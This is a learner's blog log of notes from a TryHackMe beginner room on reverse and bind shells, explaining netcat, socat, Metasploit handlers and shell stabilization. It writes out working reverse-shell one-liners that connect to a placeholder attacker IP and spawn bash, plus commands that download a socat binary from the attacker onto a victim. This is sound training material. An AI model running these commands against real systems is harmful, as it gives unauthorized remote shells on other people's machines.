---
title: 'TryHackMe: Complete Beginner'
date: 2021-10-27 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2021-10-27-tryhackme-complete-beginner.html
author: 100007
---

# What the Shell?

## What Is a Shell?

Terminology:

- REVERSE SHELLS are shells where the target is forced to connect back to the attacker.
- BIND SHELLS are shells bound to a port on the target that the attacker can connect to later.

## Tools

Typical tools for creating reverse shells or connecting to bind shells:

- `netcat` (`nc`) is present on just about every UNIX-like system. It can do just about everything, but can be a little bit unstable when constructing reverse shells.
- `socat` is a more versatile, more stable netcat. Unfortunately, it is rarely installed out-of-the-box.
- `auxilary/multi/handler` is the netcat/socat equivalent in Metasploit. It is the only way to interact with the Meterpreter attack shell, and has built-in support for staged payloads.
- `msfvenom` is a stand-alone version of multi/handler. It can also generate reverse shell payloads.

Useful sites:

- [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Reverse Shell Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

Also check out /usr/share/webshells on Kali Linux.

- [Using Metasploit](https://cardboard-iguana.com/notes/metasploit.html)

## Types of Shells

Example reverse shell:

- Attacker: `nc -lvnp $LISTENER_PORT`
- Target: `nc $ATTACKER_IP $LISTENER_PORT -e /bin/bash`

Example bind shell:

- Attacker: `nc $TARGET_IP $LISTENER_PORT`
- Target: `nc -lvnp $LISTENER_PORT -e /bin/bash`

These are almost, but not quite, mirror images of each other.

Most initial reverse shells (in particular web shells) are non-interactive.

## Netcat

While binding to well-known ports requires the use of sudo, it’s also less likely to get flagged/blocked by intermediate firewalls.

## Netcat Shell Stabilization

One thing that causes a reverse shell to be non-interactive is when its running in a shell itself. It’s generally possible to stabilize these and get a fully interactive shell on UNIX-like systems:

- Start an instance of bash connected to an actual PTY: `env TERM=xterm python -c 'import pty; pty.spawn("/bin/bash")'`
- Suspend the reverse shell.
- Use `stty raw -echo; fg` to switch to raw keycode transmission (so that things like arrow keys get pushed to our remote shell), turn off terminal echo (to prevent seeing commands twice), and foreground the reverse shell.

Note that the `stty` command can be canceled using `reset` (after closing the reverse shell). Since echo is turned off, typing this won’t be visible. Trust the force!

You can _mostly_ bypass the need for the `stty` command by using `rlwrap`, which sets all of this up for you (though it doesn’t redirect control sequences, so Ctrl+C will still kill the connection).

It’s also possible to upgrade to a socat-powered shell, assuming that you have a statically-compiled version of socat. Typically, the way that you’d transfer this binary is by first spinning up a simply webserver in the directory with your socat binary on the attack machine, and then downloading that binary to the vicitim.

- UNIX LIKE: `wget $ATTACKER_IP/socat -O /tmp/socat`
- WINDOWS (POWERSHELL): `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\Windows	emp\socat.exe`

NOTE that in _none_ of these cases will the reverse shell pick up on your terminal size, so you’ll need to manually specify it using `stty rows` and `stty cols`.

- [Quick-n-Dirty Python Web Server](https://cardboard-iguana.com/notes/quick-n-dirty-python-web-server.html)

## Socat

Socat: Just an anything-to-anything connector!

```
# Reverse shell (attacker)
#
nc -lnp $LISTENER_PORT
socat TCP-LISTEN:$LISTENER_PORT -

# Reverse shell (target)
#
nc $ATTACKER_IP $LISTENER_PORT -e /bin/bash
socat TCP:$ATTACKER_IP:$LISTENER_PORT EXEC:"/bin/bash -li"

# Bind shell (attacker)
#
nc $TARGET_IP $LISTENER_PORT
socat TCP:$TARGET_IP:$LISTENER_PORT

# Bind shell (target)
#
nc -lnp $LISTENER_PORT -e /bin/bash
socat TCP-LISTEN:$LISTENER_PORT EXEC:"/bin/bash -li"
```

This gets us an interactive login shell right out the gate, though we’re still vulnerable to Ctrl+C. Note that when binding to PowerShell, use `powershell.exe,pipes` in order to force PowerShell to use UNIX-style STDIN/STDOUT.

We can use socat to create an auto-stabilized reverse shell on UNIX-like systems (though we will still need to use `stty` to set rows/columns).

```
# Attacker: Connect $LISTENER_PORT to the current TTY,
# send raw keycodes, and turn off terminal echo.
# Basically the `stty raw -echo`.
#
socat TCP-LISTEN:$LISTENER_PORT FILE:`tty`,raw,echo=0

# Target: Connect the listener on the attacker to an
# interactive login bash shell.
#
# pty - allocate a PTTY
# stderr - redirect STDERR to the attacker
# sigint - pass signals (Ctrl+C) through
# setsid - use a new session
# sane - use a variety of tweaks to "normalize" the
# terminal's environment
#
socat TCP:$ATTACKER_IP:$LISTENER_PORT \
	EXEC:"/bin/bash -li",pty,stderr,sigint,setsid,sane
```

NOTE that it’s perfectly acceptable to kick off a socat process from inside a netcat process!

